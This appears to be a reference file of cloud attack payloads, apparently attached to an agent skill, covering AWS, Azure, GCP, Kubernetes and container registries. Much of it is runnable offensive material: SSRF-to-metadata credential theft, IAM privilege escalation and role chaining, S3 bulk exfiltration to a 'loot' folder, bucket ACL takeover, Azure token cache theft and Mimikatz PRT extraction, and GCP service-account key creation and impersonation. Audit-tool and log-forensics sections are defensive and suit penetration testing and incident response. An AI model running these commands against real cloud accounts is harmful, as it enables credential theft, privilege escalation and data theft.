# Cloud Security -- Attack Payloads

> This file is a companion to `SKILL.md`, containing cloud security attack payloads organized by category.

---

## 1. AWS Security Testing (awscli / ScoutSuite / Prowler)

### AWS CLI Basic Enumeration

```bash
# Confirm current identity and account
aws sts get-caller-identity

# List all regions
aws ec2 describe-regions --query 'Regions[*].RegionName' --output text

# Enumerate EC2 instances
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,SecurityGroups[*].GroupId]' --output table

# Enumerate RDS instances
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,PubliclyAccessible]' --output table

# Enumerate Lambda functions
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table
```

### ScoutSuite Multi-Cloud Audit

```bash
# AWS security audit
scout aws --profile default --report-dir ./report

# View the generated report in a browser
# Focus areas: IAM > Bucket policies > Security groups > Encryption configuration > Logging status
```

### Prowler Compliance Scanning

```bash
# Install Prowler
pip install prowler

# Run AWS security assessment
prowler aws -p default

# Check specific categories only
prowler aws -p default --checks iam,ec2,s3

# Output JSON format
prowler aws -p default -o json > prowler-results.json
```

---

## 2. Azure Security Testing

### Azure CLI Enumeration

```bash
# Login and get subscription information
az login
az account list --output table
az account set --subscription "TARGET_SUB_ID"

# Enumerate resource groups
az group list --output table

# Enumerate virtual machines
az vm list --show-details --query '[].[name,location,publicIps]' --output table

# Enumerate storage accounts
az storage account list --query '[].[name,location,enableHttpsTrafficOnly]' --output table

# Enumerate Key Vaults
az keyvault list --query '[].[name,location,enabledForDeployment]' --output table
```

### ScoutSuite Azure Audit

```bash
# Azure security audit
scout azure --cli

# Focus areas: RBAC assignments > Storage account encryption > NSG rules > Key Vault access policies
```

---

## 3. GCP Security Testing

### gcloud CLI Enumeration

```bash
# Authentication and project enumeration
gcloud auth login
gcloud projects list --format="table(projectId,name,lifecycleState)"
gcloud config set project TARGET_PROJECT_ID

# Enumerate Compute Engine instances
gcloud compute instances list --format="table(name,zone,status,networkInterfaces[0].accessConfigs[0].natIP)"

# Enumerate Cloud Storage buckets
gcloud storage ls --project TARGET_PROJECT_ID

# Enumerate Cloud Functions
gcloud functions list --format="table(name,region,runtime)"

# Enumerate IAM policies
gcloud projects get-iam-policy TARGET_PROJECT_ID --format=json
```

### ScoutSuite GCP Audit

```bash
# GCP security audit
scout gcp --project-id my-project
```

---

## 4. S3 Bucket Enumeration and Misconfiguration Detection

### awscli -- Bucket ACL and Policy

```bash
# List all buckets
aws s3api list-buckets --query 'Buckets[*].Name'

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket

# Check encryption configuration
aws s3api get-bucket-encryption --bucket target-bucket

# Check versioning status
aws s3api get-bucket-versioning --bucket target-bucket

# Check logging configuration
aws s3api get-bucket-logging --bucket target-bucket
```

### Anonymous Access Testing

```bash
# List public bucket contents without authentication
aws s3 ls s3://target-bucket --no-sign-request

# Download sensitive files without authentication
aws s3 cp s3://target-bucket/secrets.txt . --no-sign-request

# Anonymous upload test (verify write permissions)
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request
```

### s3scanner Batch Scanning

```bash
# Scan a single bucket
s3scanner scan --bucket company-backup

# Batch scan bucket list
s3scanner scan --bucket-list buckets.txt --output results.json
```

---

## 5. IAM Policy Analysis

### pacu -- AWS Penetration Testing Framework

```bash
# Install and start pacu
git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu
pip install -r requirements.txt
python3 pacu.py

# pacu interactive operations
set_keys                              # Configure AWS credentials
run iam__enum_users                   # Enumerate IAM users
run iam__enum_roles                   # Enumerate IAM roles
run iam__enum_policies                # Enumerate policies
run iam__privesc_scan                 # Scan privilege escalation paths
run ec2__enum                         # Enumerate EC2 instances
```

### awscli -- Manual IAM Enumeration

```bash
# List users
aws iam list-users --output table

# List roles
aws iam list-roles --query 'Roles[*].RoleName'

# Get policy details
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --version-id v1

# List policies attached to user
aws iam list-attached-user-policies --user-name target-user

# List role trust policy
aws iam get-role --role-name target-role --query 'Role.AssumeRolePolicyDocument'

# List access keys
aws iam list-access-keys --user-name target-user

# Check MFA status
aws iam list-mfa-devices --user-name target-user
```

---

## 6. Cloud Metadata Exploitation (SSRF to Cloud)

### AWS IMDSv1 / IMDSv2

```bash
# IMDSv1 -- Obtain IAM temporary credentials via SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv1 -- Get instance metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/user-data

# IMDSv2 -- Requires PUT request to obtain token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Configure AWS CLI with stolen temporary credentials
aws configure set aws_access_key_id ASIA...
aws configure set aws_secret_access_key wJalrXU...
aws configure set aws_session_token FwoGZXI...
```

### Azure IMDS

```bash
# Azure instance metadata
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Azure get managed identity token
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### GCP Metadata

```bash
# GCP instance metadata
curl -H "Metadata-Flavor:Google" "http://169.254.169.254/computeMetadata/v1/"

# GCP get service account token
curl -H "Metadata-Flavor:Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

---

## 7. Serverless Security Testing

### Lambda Function Enumeration and Security Assessment

```bash
# Enumerate Lambda functions and environment variables (may contain secrets)
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table
aws lambda get-function-configuration --function-name target-function --query 'Environment.Variables'

# Enumerate Lambda layers (may contain shared secrets)
aws lambda list-layers --query 'Layers[*].[LayerName,LatestMatchingVersion.Version]'

# Get function code download link
aws lambda get-function --function-name target-function --query 'Code.Location'

# Check function concurrency configuration
aws lambda get-function-concurrency --function-name target-function
```

---

## 8. Kubernetes / Docker Cloud Exploitation

### trivy -- Container and IaC Scanning

```bash
# Scan container image vulnerabilities
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL alpine:3.18

# Scan IaC configuration files (Terraform/CloudFormation)
trivy config ./terraform/
trivy config ./cloudformation/

# Scan Kubernetes cluster
trivy k8s --report summary cluster

# File system scan
trivy fs --severity HIGH,CRITICAL /path/to/project
```

### kubeaudit -- Kubernetes Security Audit

```bash
# Automated security audit
kubeaudit all -n kube-system

# Detect and suggest fixes
kubeaudit autofix -f deployment.yaml
```

### kubectl -- Manual RBAC Audit

```bash
# List all roles and cluster roles
kubectl get roles --all-namespaces
kubectl get clusterroles -o json | jq '.items[].rules'

# Check specific ServiceAccount permissions
kubectl auth can-i --list --as=system:serviceaccount:default:sac

# Check dangerous RBAC rules -- anonymous user binding
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.subjects[]?.name=="system:anonymous")'

# Check Pod security contexts
kubectl get pods -o json | jq '.items[].spec.securityContext'

# Detect privileged containers
kubectl get pods -o json | jq '.items[].spec.containers[].securityContext.privileged'

# Check hostPath mounts
kubectl get pods -o json | jq '.items[].spec.volumes[] | select(.hostPath)'
```

---

## 9. AWS IAM Enumeration

### Policy Analysis

```bash
# Enumerate all inline policies for all users
for user in $(aws iam list-users --query 'Users[*].UserName' --output text); do
  echo "=== $user ==="
  aws iam list-user-policies --user-name "$user"
  aws iam list-attached-user-policies --user-name "$user"
done

# Find users with AdministratorAccess
aws iam list-entities-for-policy \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --query '{Users: PolicyUsers, Roles: PolicyRoles, Groups: PolicyGroups}'

# Analyze policy for dangerous permissions (wildcard actions)
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/CustomPolicy \
  --version-id v1 \
  --query 'PolicyVersion.Document' | jq '.Statement[] | select(.Effect=="Allow" and (.Action | tostring | contains("*")))'

# List all access keys and their last used date
for user in $(aws iam list-users --query 'Users[*].UserName' --output text); do
  aws iam list-access-keys --user-name "$user" --query "AccessKeyMetadata[*].[UserName,AccessKeyId,Status,CreateDate]" --output text
done
```

### Privilege Escalation Paths

```python
# Enumerate IAM privilege escalation paths using boto3
import boto3
import json

iam = boto3.client('iam')

PRIVESC_ACTIONS = [
    'iam:CreatePolicyVersion', 'iam:SetDefaultPolicyVersion',
    'iam:PassRole', 'iam:CreateLoginProfile', 'iam:UpdateLoginProfile',
    'iam:AttachUserPolicy', 'iam:AttachGroupPolicy', 'iam:AttachRolePolicy',
    'iam:PutUserPolicy', 'iam:PutGroupPolicy', 'iam:PutRolePolicy',
    'iam:AddUserToGroup', 'iam:UpdateAssumeRolePolicy',
    'sts:AssumeRole', 'lambda:CreateFunction', 'lambda:InvokeFunction',
    'ec2:RunInstances', 'iam:CreateAccessKey'
]

def check_user_privesc(username):
    """Check if user has any privilege escalation permissions."""
    escalation_paths = []
    
    # Check inline policies
    for policy_name in iam.list_user_policies(UserName=username)['PolicyNames']:
        policy = iam.get_user_policy(UserName=username, PolicyName=policy_name)
        doc = policy['PolicyDocument']
        for stmt in doc.get('Statement', []):
            if stmt['Effect'] == 'Allow':
                actions = stmt.get('Action', [])
                if isinstance(actions, str):
                    actions = [actions]
                for action in actions:
                    if action == '*' or action in PRIVESC_ACTIONS:
                        escalation_paths.append({
                            'user': username,
                            'policy': policy_name,
                            'action': action,
                            'resource': stmt.get('Resource', '*')
                        })
    return escalation_paths

users = iam.list_users()['Users']
for user in users:
    paths = check_user_privesc(user['UserName'])
    if paths:
        print(f"[!] {user['UserName']} has {len(paths)} privesc paths:")
        for p in paths:
            print(f"    - {p['action']} via {p['policy']}")
```

### Role Chaining

```bash
# Enumerate assumable roles from current identity
aws iam list-roles --query 'Roles[*].[RoleName,AssumeRolePolicyDocument]' --output json | \
  jq '.[] | select(.[1].Statement[].Principal.AWS != null) | .[0]'

# Assume a role and enumerate further
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name privesc-test)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')

# Verify new identity
aws sts get-caller-identity

# Chain to another role from the assumed role
aws sts assume-role \
  --role-arn arn:aws:iam::987654321098:role/CrossAccountAdmin \
  --role-session-name chain-test

# Enumerate cross-account roles
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument | to_string(@), `arn:aws:iam::`) == `true`].RoleName'
```

---

## 10. S3 Bucket Exploitation

### Misconfiguration Scanning

```bash
# Comprehensive S3 bucket permission audit
for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
  echo "=== $bucket ==="
  
  # Check public access block
  aws s3api get-public-access-block --bucket "$bucket" 2>/dev/null || echo "  [!] No public access block"
  
  # Check bucket ACL for public grants
  aws s3api get-bucket-acl --bucket "$bucket" --query 'Grants[?Grantee.URI==`http://acs.amazonaws.com/groups/global/AllUsers`]'
  
  # Check bucket policy for public access
  aws s3api get-bucket-policy --bucket "$bucket" 2>/dev/null | \
    jq '.Policy | fromjson | .Statement[] | select(.Principal=="*" or .Principal.AWS=="*")'
done

# Scan for publicly listable buckets using wordlist
while read bucket_name; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$bucket_name.s3.amazonaws.com/")
  if [ "$STATUS" != "404" ]; then
    echo "[+] $bucket_name exists (HTTP $STATUS)"
    aws s3 ls "s3://$bucket_name" --no-sign-request 2>/dev/null && echo "  [!] PUBLICLY LISTABLE"
  fi
done < bucket_wordlist.txt
```

### Data Exfiltration

```bash
# Download all accessible objects from a misconfigured bucket
aws s3 sync s3://target-bucket ./exfil/ --no-sign-request

# Search for sensitive files in bucket
aws s3 ls s3://target-bucket --recursive --no-sign-request | \
  grep -iE "\.(sql|bak|env|pem|key|csv|xlsx|json|conf|config)$"

# Download specific sensitive file types
aws s3 cp s3://target-bucket/backup/database.sql ./loot/ --no-sign-request
aws s3 cp s3://target-bucket/.env ./loot/ --no-sign-request

# Check for versioned objects (may contain deleted secrets)
aws s3api list-object-versions --bucket target-bucket --no-sign-request | \
  jq '.Versions[] | select(.Key | test("password|secret|key|credential"))'

# Retrieve a deleted version
aws s3api get-object --bucket target-bucket --key secrets.txt \
  --version-id "VERSION_ID" ./loot/secrets_old.txt --no-sign-request
```

### ACL Abuse

```bash
# Check if bucket allows authenticated AWS users to write
aws s3api get-bucket-acl --bucket target-bucket | \
  jq '.Grants[] | select(.Grantee.URI=="http://acs.amazonaws.com/groups/global/AuthenticatedUsers")'

# Upload a test file to verify write access
echo "write-test" | aws s3 cp - s3://target-bucket/write_test.txt

# Modify bucket ACL if WRITE_ACP permission exists
aws s3api put-bucket-acl --bucket target-bucket \
  --grant-full-control id=YOUR_CANONICAL_USER_ID

# Check for presigned URL generation capability
aws s3 presign s3://target-bucket/sensitive-file.pdf --expires-in 3600
```

---

## 11. Azure AD Attacks

### Token Theft

```bash
# Extract Azure AD tokens from az CLI cache
cat ~/.azure/accessTokens.json | jq '.[].accessToken'

# Extract tokens from Azure PowerShell token cache
cat ~/.azure/TokenCache.dat

# Request token using managed identity from compromised VM
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .

# Request token for Microsoft Graph
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | jq .

# Use stolen token with Azure CLI
az account get-access-token --resource https://management.azure.com/
az rest --method GET --url "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  --headers "Authorization=Bearer $TOKEN"
```

### Application Consent Abuse

```python
# Enumerate Azure AD applications with dangerous permissions
import requests

GRAPH_URL = "https://graph.microsoft.com/v1.0"
TOKEN = "STOLEN_ACCESS_TOKEN"
headers = {"Authorization": f"Bearer {TOKEN}"}

# List all applications
apps = requests.get(f"{GRAPH_URL}/applications", headers=headers).json()

dangerous_permissions = [
    'Directory.ReadWrite.All', 'RoleManagement.ReadWrite.Directory',
    'Application.ReadWrite.All', 'Mail.ReadWrite', 'Files.ReadWrite.All'
]

for app in apps.get('value', []):
    app_perms = []
    for req in app.get('requiredResourceAccess', []):
        for perm in req.get('resourceAccess', []):
            app_perms.append(perm['id'])
    
    # Check service principal for granted permissions
    sp_url = f"{GRAPH_URL}/servicePrincipals?$filter=appId eq '{app['appId']}'"
    sp = requests.get(sp_url, headers=headers).json()
    
    if sp.get('value'):
        print(f"[*] App: {app['displayName']} (AppId: {app['appId']})")
        
        # Check oauth2PermissionGrants (delegated)
        grants_url = f"{GRAPH_URL}/servicePrincipals/{sp['value'][0]['id']}/oauth2PermissionGrants"
        grants = requests.get(grants_url, headers=headers).json()
        for grant in grants.get('value', []):
            print(f"    Delegated: {grant['scope']}")
```

### PRT Extraction

```bash
# Extract Primary Refresh Token (PRT) from Windows device (requires SYSTEM)
# Using Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::cloudap" "exit"

# Using ROADtools to analyze Azure AD tokens
pip install roadtools
roadtx auth --prt-cookie "$PRT_COOKIE" --prt-sessionkey "$SESSION_KEY"
roadtx describe < token.txt

# Use PRT to request access tokens
roadtx prt -c "$PRT_COOKIE" -k "$SESSION_KEY" \
  --resource https://graph.microsoft.com

# Enumerate Azure AD with stolen token
roadrecon auth --access-token "$ACCESS_TOKEN"
roadrecon gather
roadrecon gui
```

---

## 12. GCP Service Account Abuse

### Key Extraction

```bash
# List service accounts in project
gcloud iam service-accounts list --format="table(email,displayName,disabled)"

# List service account keys (check for user-managed keys)
gcloud iam service-accounts keys list \
  --iam-account=sa@project.iam.gserviceaccount.com \
  --format="table(name,validAfterTime,validBeforeTime,keyType)"

# Create new key for service account (if iam.serviceAccountKeys.create permission)
gcloud iam service-accounts keys create key.json \
  --iam-account=sa@project.iam.gserviceaccount.com

# Activate service account with stolen key
gcloud auth activate-service-account --key-file=key.json
gcloud config set account sa@project.iam.gserviceaccount.com
```

### Impersonation

```bash
# Impersonate service account (requires iam.serviceAccounts.getAccessToken)
gcloud auth print-access-token --impersonate-service-account=target-sa@project.iam.gserviceaccount.com

# Use impersonation for resource access
gcloud compute instances list \
  --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com

# Generate OAuth2 token via impersonation
curl -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/target-sa@project.iam.gserviceaccount.com:generateAccessToken" \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}'

# Chain impersonation through multiple service accounts
gcloud auth print-access-token \
  --impersonate-service-account=sa1@proj.iam.gserviceaccount.com,sa2@proj.iam.gserviceaccount.com
```

### Metadata Exploitation

```bash
# Access GCP metadata from compromised instance
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get all instance attributes
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true"

# Get project-level metadata (may contain startup scripts with secrets)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true"

# Get SSH keys from metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Get service account scopes
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
```

---

## 13. Container Registry Attacks

### Image Pulling

```bash
# Enumerate ECR repositories
aws ecr describe-repositories --query 'repositories[*].[repositoryName,repositoryUri]' --output table

# Get ECR login token and pull images
aws ecr get-login-password | docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-east-1.amazonaws.com
docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/internal-app:latest

# Enumerate GCR images
gcloud container images list --repository=gcr.io/target-project
gcloud container images list-tags gcr.io/target-project/app

# Pull from GCR
docker pull gcr.io/target-project/app:latest

# Enumerate ACR repositories
az acr repository list --name targetregistry --output table
az acr repository show-tags --name targetregistry --repository app --output table
```

### Layer Analysis

```bash
# Export and analyze image layers for secrets
docker save target-image:latest -o image.tar
mkdir image_layers && tar xf image.tar -C image_layers/

# Search all layers for secrets
for layer in image_layers/*/layer.tar; do
  echo "=== Analyzing: $layer ==="
  tar tf "$layer" 2>/dev/null | grep -iE "\.(env|pem|key|conf|json|yml|yaml)$"
  tar xf "$layer" -O 2>/dev/null | grep -iE "(password|secret|api.key|token|private)" | head -5
done

# Use dive for interactive layer analysis
dive target-image:latest --ci --lowestEfficiency 0.9

# Extract specific file from image history
docker history --no-trunc target-image:latest | grep -i "ENV\|ARG\|COPY\|ADD"
```

### Secret Extraction

```python
# Automated secret extraction from container registry images
import subprocess
import json
import re
import os
import tempfile

SECRET_PATTERNS = [
    r'(?i)(aws_access_key_id|aws_secret_access_key)\s*[=:]\s*\S+',
    r'(?i)(password|passwd|pwd)\s*[=:]\s*\S+',
    r'(?i)(api[_-]?key|apikey)\s*[=:]\s*\S+',
    r'(?i)(secret[_-]?key|private[_-]?key)\s*[=:]\s*\S+',
    r'(?i)(database_url|db_url|connection_string)\s*[=:]\s*\S+',
    r'AKIA[0-9A-Z]{16}',  # AWS Access Key
    r'ghp_[a-zA-Z0-9]{36}',  # GitHub PAT
]

def scan_image_for_secrets(image_name):
    """Pull and scan container image layers for secrets."""
    findings = []
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Save image
        tar_path = os.path.join(tmpdir, 'image.tar')
        subprocess.run(['docker', 'save', image_name, '-o', tar_path], check=True)
        subprocess.run(['tar', 'xf', tar_path, '-C', tmpdir], check=True)
        
        # Scan each layer
        for root, dirs, files in os.walk(tmpdir):
            for f in files:
                if f == 'layer.tar':
                    layer_content = subprocess.run(
                        ['tar', 'tf', os.path.join(root, f)],
                        capture_output=True, text=True
                    ).stdout
                    
                    for pattern in SECRET_PATTERNS:
                        matches = re.findall(pattern, layer_content)
                        if matches:
                            findings.append({
                                'image': image_name,
                                'layer': root,
                                'pattern': pattern,
                                'matches': matches[:5]
                            })
    return findings

results = scan_image_for_secrets('target-registry/app:latest')
for r in results:
    print(f"[!] Secret found in {r['image']}: {r['matches']}")
```

---

## 14. Cloud Forensics

### CloudTrail Analysis

```bash
# Search CloudTrail for suspicious API calls
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \
  --start-time "2026-05-01T00:00:00Z" \
  --end-time "2026-05-30T23:59:59Z" \
  --query 'Events[*].[EventTime,Username,EventName,SourceIPAddress]' --output table

# Find IAM credential creation events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey \
  --query 'Events[*].[EventTime,Username,CloudTrailEvent]'

# Search for unauthorized API calls (AccessDenied)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=UnauthorizedAccess \
  --max-results 50

# Find S3 data exfiltration events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceType,AttributeValue=AWS::S3::Object \
  --start-time "2026-05-29T00:00:00Z" | \
  jq '.Events[] | select(.EventName | test("Get|Copy|Download"))'
```

### Log Correlation

```python
# Correlate CloudTrail events to build attack timeline
import boto3
import json
from datetime import datetime, timedelta
from collections import defaultdict

cloudtrail = boto3.client('cloudtrail')

def build_attack_timeline(suspect_ip, hours_back=24):
    """Build timeline of all actions from a suspicious IP."""
    end_time = datetime.utcnow()
    start_time = end_time - timedelta(hours=hours_back)
    
    events = []
    paginator = cloudtrail.get_paginator('lookup_events')
    
    for page in paginator.paginate(
        LookupAttributes=[{'AttributeKey': 'EventSource', 'AttributeValue': 'iam.amazonaws.com'}],
        StartTime=start_time,
        EndTime=end_time
    ):
        for event in page['Events']:
            detail = json.loads(event['CloudTrailEvent'])
            if detail.get('sourceIPAddress') == suspect_ip:
                events.append({
                    'time': event['EventTime'].isoformat(),
                    'event': event['EventName'],
                    'user': event.get('Username', 'unknown'),
                    'source_ip': detail.get('sourceIPAddress'),
                    'user_agent': detail.get('userAgent', ''),
                    'resources': event.get('Resources', []),
                    'error': detail.get('errorCode', None)
                })
    
    # Sort by time and group by user
    events.sort(key=lambda x: x['time'])
    by_user = defaultdict(list)
    for e in events:
        by_user[e['user']].append(e)
    
    return {'timeline': events, 'by_user': dict(by_user), 'total_events': len(events)}

timeline = build_attack_timeline('203.0.113.42', hours_back=48)
print(f"Total suspicious events: {timeline['total_events']}")
for event in timeline['timeline']:
    status = f"[ERROR: {event['error']}]" if event['error'] else "[OK]"
    print(f"  {event['time']} | {event['user']} | {event['event']} {status}")
```

### Incident Timeline

```bash
# Azure Activity Log forensics
az monitor activity-log list \
  --start-time "2026-05-29T00:00:00Z" \
  --end-time "2026-05-30T23:59:59Z" \
  --caller "suspect@company.com" \
  --query '[].{Time:eventTimestamp, Op:operationName.value, Status:status.value}' \
  --output table

# GCP Cloud Audit Logs analysis
gcloud logging read \
  'protoPayload.authenticationInfo.principalEmail="suspect@company.com"
   AND timestamp>="2026-05-29T00:00:00Z"' \
  --format=json --limit=100 | \
  jq '.[] | {time: .timestamp, method: .protoPayload.methodName, resource: .resource.type}'

# AWS GuardDuty findings export
aws guardduty list-findings --detector-id DETECTOR_ID \
  --finding-criteria '{"Criterion":{"severity":{"Gte":7}}}' | \
  jq '.FindingIds[]' | xargs -I{} aws guardduty get-findings \
  --detector-id DETECTOR_ID --finding-ids {} | \
  jq '.Findings[] | {type: .Type, severity: .Severity, title: .Title, time: .CreatedAt}'

# Cross-cloud timeline correlation script
#!/bin/bash
echo "=== AWS CloudTrail ==="
aws cloudtrail lookup-events --start-time "$START" --end-time "$END" \
  --query 'Events[*].[EventTime,EventName]' --output text | sort

echo "=== Azure Activity Log ==="
az monitor activity-log list --start-time "$START" --end-time "$END" \
  --query '[].{t:eventTimestamp,op:operationName.value}' --output tsv | sort

echo "=== GCP Audit Log ==="
gcloud logging read "timestamp>=\"$START\" AND timestamp<=\"$END\"" \
  --format="value(timestamp,protoPayload.methodName)" | sort
```
